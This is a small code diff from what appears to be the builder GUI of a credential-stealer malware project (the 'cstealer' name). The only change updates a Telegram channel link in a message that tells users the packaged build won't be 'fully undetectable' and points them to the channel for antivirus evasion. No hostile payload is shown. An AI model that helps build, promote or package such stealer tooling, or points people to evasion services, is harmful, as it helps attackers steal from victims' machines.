@@ -59,7 +59,7 @@ def build_exe():
         else:
             icon_option = ''
 
-        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - t.me/cstealerr"
+        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - t.me/cservicess"
         messagebox.showinfo("Information", message)
 
         # Customizing PyInstaller build command
